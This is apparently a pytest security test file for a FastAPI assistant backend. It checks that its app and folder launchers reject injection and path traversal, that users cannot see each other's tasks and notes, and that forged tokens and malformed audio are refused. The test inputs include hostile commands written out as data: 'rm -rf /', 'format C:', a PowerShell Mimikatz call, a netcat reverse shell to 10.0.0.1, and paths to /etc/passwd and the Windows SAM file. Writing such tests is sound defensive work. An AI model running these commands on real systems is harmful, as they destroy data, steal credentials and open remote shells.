import pytest
from fastapi.testclient import TestClient
from sqlalchemy import create_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy.pool import StaticPool

from backend.main import app
from backend.database.database import Base, get_db
from backend.database.models import User, Task, Note
from backend.security import create_access_token
from backend.tools.app_launcher import launch_application
from backend.tools.folder_launcher import launch_folder

# In-memory SQLite
SQLALCHEMY_TEST_DATABASE_URL = "sqlite:///:memory:"
engine = create_engine(
    SQLALCHEMY_TEST_DATABASE_URL,
    connect_args={"check_same_thread": False},
    poolclass=StaticPool
)
TestingSessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)


def override_get_db():
    db = TestingSessionLocal()
    try:
        yield db
    finally:
        db.close()


@pytest.fixture(scope="function")
def client():
    Base.metadata.create_all(bind=engine)
    app.dependency_overrides[get_db] = override_get_db
    with TestClient(app) as test_client:
        yield test_client
    Base.metadata.drop_all(bind=engine)
    app.dependency_overrides.clear()


# ==========================================
# 1. Injection & Sandboxing Tests
# ==========================================

def test_command_injection_attempt():
    malicious_inputs = [
        "calc.exe && rm -rf /",
        "notepad.exe; format C:",
        "cmd.exe | echo hacked",
        "powershell -ExecutionPolicy Bypass -Command 'Invoke-Mimikatz'",
        "nc -e cmd.exe 10.0.0.1 4444"
    ]
    for attempt in malicious_inputs:
        res = launch_application(attempt)
        assert res["success"] is False
        assert "Security restriction" in res["error"]


def test_folder_path_traversal_attempt():
    traversal_inputs = [
        "../../Windows/System32",
        "..\\..\\Windows\\System32\\drivers",
        "C:/Windows/System32/config/SAM",
        "/etc/passwd",
        "/var/log"
    ]
    for attempt in traversal_inputs:
        res = launch_folder(attempt)
        assert res["success"] is False
        assert "Security restriction" in res["error"]


# ==========================================
# 2. Cross-User Data Isolation Tests
# ==========================================

def test_cross_user_data_isolation(client):
    # Register User A
    res_a = client.post("/api/auth/register", json={
        "name": "User Alpha",
        "email": "alpha@sadie.ai",
        "password": "Password123!"
    })
    token_a = res_a.json()["access_token"]
    headers_a = {"Authorization": f"Bearer {token_a}"}

    # Register User B
    res_b = client.post("/api/auth/register", json={
        "name": "User Beta",
        "email": "beta@sadie.ai",
        "password": "Password123!"
    })
    token_b = res_b.json()["access_token"]
    headers_b = {"Authorization": f"Bearer {token_b}"}

    # User A creates a task and a note
    task_a = client.post("/api/tasks", json={"title": "Alpha Secret Task"}, headers=headers_a).json()
    note_a = client.post("/api/notes", json={"title": "Alpha Private Note", "content": "Secret content"}, headers=headers_a).json()

    # User B should NOT see User A's tasks or notes
    tasks_b = client.get("/api/tasks", headers=headers_b).json()
    assert len(tasks_b) == 0

    notes_b = client.get("/api/notes", headers=headers_b).json()
    assert len(notes_b) == 0

    # User B attempting to fetch or delete User A's task -> Expect 404
    get_res = client.get(f"/api/tasks/{task_a['id']}", headers=headers_b)
    assert get_res.status_code == 404

    del_res = client.delete(f"/api/tasks/{task_a['id']}", headers=headers_b)
    assert del_res.status_code == 404

    # User B attempting to delete User A's note -> Expect 404
    del_note_res = client.delete(f"/api/notes/{note_a['id']}", headers=headers_b)
    assert del_note_res.status_code == 404


# ==========================================
# 3. Forged and Corrupted Token Tests
# ==========================================

def test_forged_jwt_token_rejection(client):
    forged_token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxIn0.fake_signature_12345678"
    res = client.get("/api/auth/me", headers={"Authorization": f"Bearer {forged_token}"})
    assert res.status_code == 401


def test_corrupted_audio_payload_safety(client):
    # Send garbage base64 audio
    res = client.post("/api/voice/transcribe", json={"audio_base64": "NOT_REAL_BASE64_DATA!@#$%"})
    assert res.status_code == 400
    assert "detail" in res.json()
